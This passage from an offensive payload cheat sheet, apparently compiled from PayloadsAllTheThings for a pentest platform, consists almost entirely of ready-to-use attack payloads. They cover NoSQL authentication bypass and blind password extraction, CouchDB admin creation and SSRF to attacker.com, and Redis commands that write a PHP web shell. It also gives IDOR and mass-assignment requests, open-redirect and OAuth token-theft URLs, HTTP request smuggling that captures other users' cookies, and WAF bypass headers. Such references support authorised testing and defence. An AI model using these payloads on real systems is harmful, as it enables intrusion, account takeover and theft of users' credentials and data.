(attribute=*val)        Substring (suffix)
(attribute=*val*)       Substring (contains)

# Boolean
(&(filter1)(filter2))   AND
(|(filter1)(filter2))   OR
(!(filter))             NOT

# Examples
(&(uid=admin)(userPassword=secret))
(|(sn=Smith)(givenName=John))
(&(objectClass=user)(!(sn=Jones)))
```

---

## 17. NoSQL Injection

### Description
NoSQL injection targets MongoDB, CouchDB, Redis, Cassandra and other non-relational databases using operator injection and JavaScript execution.

### MongoDB Authentication Bypass
```
# JSON body:
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$ne": "wrong"}}
{"username": "admin", "password": {"$gt": ""}}

# URL params:
user[$ne]=x&password[$ne]=x
user[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*

# Dump all users
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### MongoDB Operator Injection
```javascript
// $ne - not equal
{"username": {"$ne": "invalid"}}

// $gt - greater than
{"username": {"$gt": ""}}

// $regex - regular expression
{"username": {"$regex": "^a"}}
{"username": {"$regex": "admin"}}

// $where - JavaScript execution
{"$where": "this.username == 'admin'"}
{"$where": "function(){return this.password.match(/test/)}"}
{"$where": "sleep(5000)"}  // Time-based blind

// $exists
{"username": {"$exists": true}}

// Array operators
{"username": {"$in": ["admin", "root", "superuser"]}}
```

### MongoDB Blind Extraction (Boolean)
```javascript
// Extract password character by character
{"username": "admin", "password": {"$regex": "^a"}}  // Test if password starts with 'a'
{"username": "admin", "password": {"$regex": "^ab"}} // Test if starts with 'ab'

// Extract via $where
{"$where": "this.username == 'admin' && this.password[0] == 'a'"}
{"$where": "this.username == 'admin' && this.password.length == 8"}
```

### CouchDB Injection
```
# Path traversal to admin
GET /_users/org.couchdb.user:admin HTTP/1.1

# Create admin user
PUT /_users/org.couchdb.user:attacker
{"name":"attacker","password":"password","roles":["_admin"],"type":"user"}

# SSRF via CouchDB replication
POST /_replicate
{"source": "http://attacker.com/", "target": "https://target.com/db"}
```

### Redis Injection
```
# Injecting into Redis commands
FLUSHALL
SET key value
GET key
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['cmd']); ?>"
BGSAVE
```

### Cheat Sheet
| Operator | Effect | Bypass Scenario |
|----------|--------|-----------------|
| `$ne` | Not equal | Auth bypass with `{"$ne": null}` |
| `$gt` | Greater than | Auth bypass with `{"$gt": ""}` |
| `$regex` | Regex match | Blind enumeration |
| `$where` | JavaScript exec | RCE/time-based blind |
| `$in` | Array match | Multiple value test |
| `$exists` | Field existence | Schema enumeration |

---

## 18. IDOR / BOLA

### Description
Insecure Direct Object References (IDOR) / Broken Object Level Authorization (BOLA) occur when apps expose internal object identifiers without proper authorization checks.

### Detection — Parameter Manipulation
```
# Numeric IDs — increment/decrement
/api/user/1
/api/user/2
/api/user/100

# UUID/GUID — swap with another user's GUID
/api/orders/3f7b3c4d-1234-5678-abcd-ef1234567890

# Encoded IDs
/api/user?id=dXNlcjox  (base64 for "user:1")
/api/user?id=dXNlcjoy  (base64 for "user:2")

# Hashed IDs (MD5/SHA1 of integer)
/api/user/5058f1af8388633f609cadb75a75dc9d  (MD5 of 1)
/api/user/c4ca4238a0b923820dcc509a6f75849b  (MD5 of 1 → try MD5 of 2)
```

### Common IDOR Locations
```
# URL parameters
GET /api/user?id=123
GET /api/document?doc_id=456
GET /download?file=report_123.pdf

# Path parameters
GET /api/users/123/profile
GET /api/orders/456/details
GET /files/user_123/photo.jpg

# POST body
POST /api/transfer
{"from_account": "12345", "to_account": "67890", "amount": 100}

# Headers
X-User-Id: 123
X-Account-Id: 456

# Cookies
user_id=123

# JSON Web Token payload
{"sub": "user_123", "role": "user"}
```

### HTTP Method Switching
```
# Server may check auth on POST but not GET
GET /api/admin/users     # blocked
→ Try:
POST /api/admin/users    # allowed?
PUT /api/admin/users/1   # allowed?
DELETE /api/admin/users/1

# TRACE method to debug
TRACE /api/private HTTP/1.1
```

### Mass Assignment (Related to IDOR)
```json
// Normal user update:
PUT /api/user/123
{"email": "new@email.com"}

// Add privileged fields:
PUT /api/user/123
{"email": "new@email.com", "role": "admin", "is_verified": true, "account_balance": 99999}
```

### BOLA in GraphQL
```graphql
# Direct ID reference in GraphQL
{
  order(id: "ORD-001") { items total }
  order(id: "ORD-002") { items total }
}

# Batch horizontal privilege escalation
[
  {"query": "{ user(id: 1) { email creditCard } }"},
  {"query": "{ user(id: 2) { email creditCard } }"},
  {"query": "{ user(id: 3) { email creditCard } }"}
]
```

### Cheat Sheet
| Location | Test |
|----------|------|
| Numeric ID in URL | Change 1 → 2, try negatives, 0, large numbers |
| UUID | Capture another user's UUID (create 2 accounts) |
| Encoded ID | Base64 decode, modify, re-encode |
| Filename | Guess or enumerate: `user_1.pdf`, `user_2.pdf` |
| API endpoint | Try accessing other user's resources with your token |
| Method switching | Try GET instead of POST, or vice versa |

---

## 19. Open Redirect

### Description
Open redirect vulnerabilities allow attackers to redirect users from trusted sites to malicious destinations, enabling phishing and credential theft.

### Basic Payloads
```
# Direct redirect parameters
?redirect=https://attacker.com
?next=https://attacker.com
?url=https://attacker.com
?dest=https://attacker.com
?return=https://attacker.com
?goto=https://attacker.com
?target=https://attacker.com
?redir=https://attacker.com
?return_url=https://attacker.com
?return_to=https://attacker.com
?go=https://attacker.com
```

### Filter Bypass Techniques
```
# URL encoding
?redirect=https%3A%2F%2Fattacker.com
?redirect=%68%74%74%70%73%3A%2F%2Fattacker.com

# Double encoding
?redirect=https%253A%252F%252Fattacker.com

# Protocol bypass
?redirect=//attacker.com
?redirect=\/\/attacker.com
?redirect=/\attacker.com

# @ symbol (username portion)
?redirect=https://target.com@attacker.com
?redirect=https://trusted.com%40attacker.com

# CRLF injection
?redirect=https://trusted.com%0d%0aLocation:%20https://attacker.com

# Null byte
?redirect=https://attacker.com%00https://trusted.com

# Fragment
?redirect=https://trusted.com#https://attacker.com
?redirect=https://trusted.com%23https://attacker.com

# Path confusion
?redirect=https://trusted.com.attacker.com
?redirect=https://trusted.com/..%2F..%2F//attacker.com

# JavaScript
?redirect=javascript:alert(1)
?redirect=data:text/html,<script>alert(1)</script>

# Unicode
?redirect=https://attaсker.com  (Cyrillic 'с' instead of 'c')
```

### Open Redirect to Token Theft (OAuth)
```
# 1. Find open redirect in OAuth callback domain
# 2. Use it as redirect_uri
https://authserver.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/open-redirect?next=https://attacker.com&
  response_type=token

# Access token appears in URL → redirect to attacker.com → token in Referer header
```

### Cheat Sheet
| Bypass | Payload |
|--------|---------|
| Basic | `?next=https://attacker.com` |
| Protocol | `?next=//attacker.com` |
| @ bypass | `?next=https://trusted.com@attacker.com` |
| Domain check bypass | `?next=https://trusted.com.attacker.com` |
| Encoding | `?next=https%3A%2F%2Fattacker.com` |
| JavaScript | `?next=javascript:alert(1)` |

---

## 20. HTTP Request Smuggling

### Description
HTTP Request Smuggling exploits discrepancies between front-end (proxy/CDN) and back-end server interpretation of HTTP/1.1 request boundaries (Content-Length vs Transfer-Encoding headers).

### CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### TE.TE (Both use Transfer-Encoding — obfuscate one)
```http
# Obfuscate TE header so one server ignores it
POST / HTTP/1.1
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

# Variations:
Transfer-Encoding : chunked     (space before colon)
Transfer-Encoding[tab]: chunked
X: X[\n]Transfer-Encoding: chunked  (header line folding)
Transfer-Encoding: chunked
Transfer-Encoding: x            (duplicate with invalid value)
```

### Detection Timing Attack
```http
# CL.TE detection: if response is delayed, the back-end is waiting for more chunks
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X

# TE.CL detection: if response is delayed, back-end is waiting for full Content-Length
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

### Attack: Poison Next Request (CL.TE)
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin HTTP/1.1
X-Foo: x
```

### Attack: Capture Next Request (Steal Other Users' Cookies)
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 197
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target.com
Content-Length: 400
Content-Type: application/x-www-form-urlencoded
Cookie: session=ATTACKER_COOKIE

csrf=token&postId=1&name=hacker&comment=
```

### HTTP/2 Desync
```
# H2.TE: HTTP/2 request with Transfer-Encoding
# H2.CL: HTTP/2 request with Content-Length mismatch

# HTTP/2 request with injected TE header
:method POST
:path /
:authority target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### Client-Side Desync (CSD)
```http
# Endpoint that returns non-chunked 400 while allowing CL/TE abuse
# Can be used to attack other browser users via JavaScript

POST /redirect HTTP/1.1
Host: target.com
Content-Length: 57
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Forwarded-Host: attacker.com
```

### Tools
```bash
# HTTP Request Smuggler (Burp extension by James Kettle)
# Use in Burp Suite: Extensions → HTTP Request Smuggler

# smuggler.py (standalone)
python3 smuggler.py -u https://target.com/

# h2csmuggler
h2csmuggler -x https://target.com/

# Manual testing with netcat (avoid buffering)
nc target.com 80 << 'EOF'
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
EOF
```

### Cheat Sheet
| Type | Front-end uses | Back-end uses | Detection |
|------|---------------|---------------|-----------|
| CL.TE | Content-Length | Transfer-Encoding | Time delay on CL>actual |
| TE.CL | Transfer-Encoding | Content-Length | Time delay on large chunk |
| TE.TE | Transfer-Encoding | Transfer-Encoding | Obfuscate one TE header |
| H2.TE | HTTP/2 | Transfer-Encoding | HTTP/2 with TE header |
| H2.CL | HTTP/2 | Content-Length | HTTP/2 with CL mismatch |

---

## Quick Reference — WAF Bypass Master List

### Universal Encoding Techniques
```
# URL encoding
%27 = '
%22 = "
%20 = space
%2B = +
%3D = =

# Double URL encoding
%2527 = %27 = '
%2522 = %22 = "

# Unicode
\u0027 = '
\u003c = <
\u003e = >

# HTML encoding
&#39; = '
&quot; = "
&lt; = <
&gt; = >
&#x27; = '

# Base64 (use with exec context)
echo <payload> | base64

# Hex
\x27 = '
\x22 = "
\x3c = <
```

### HTTP-Level WAF Bypass
```
# Method override
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT
_method=DELETE (form field)

# Content-Type bypass
Content-Type: application/json; charset=utf-8
Content-Type: text/html; application/json

# Chunked encoding
Transfer-Encoding: chunked
# Split payload across chunks

# HTTP version
GET / HTTP/1.0  (may bypass HTTP/1.1-specific rules)

# Case variation
gEt / HTTP/1.1

# Extra headers
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: internal.target.com
```

---

## Tool Reference Summary

| Tool | Primary Use | Install |
|------|-------------|---------|
| sqlmap | SQL injection | `pip install sqlmap` |
| commix | Command injection | `pip install commix` |
| tplmap | SSTI | `pip install tplmap` |
| jwt_tool | JWT attacks | `pip install jwt_tool` |
| ysoserial | Java deserialization | Download jar |
| phpggc | PHP deserialization | `composer require phpggc` |
| dotdotpwn | Path traversal | `apt install dotdotpwn` |
| graphw00f | GraphQL fingerprint | `pip install graphw00f` |
| clairvoyance | GraphQL schema | `pip install clairvoyance` |
| hashcat | Password/JWT crack | `apt install hashcat` |
| Gopherus | SSRF gopher payloads | `pip install gopherus` |
| XSStrike | XSS | `pip install xsstrike` |
| dalfox | XSS | `go install github.com/hahwul/dalfox/v2@latest` |
| nuclei | Template-based scanning | `go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest` |

---

*End of PayloadsAllTheThings Reference — ATHENA Pentest Platform*
*Source: PayloadsAllTheThings (MIT License) — github.com/swisskyrepo/PayloadsAllTheThings*
*Compiled: 2026-02-26*
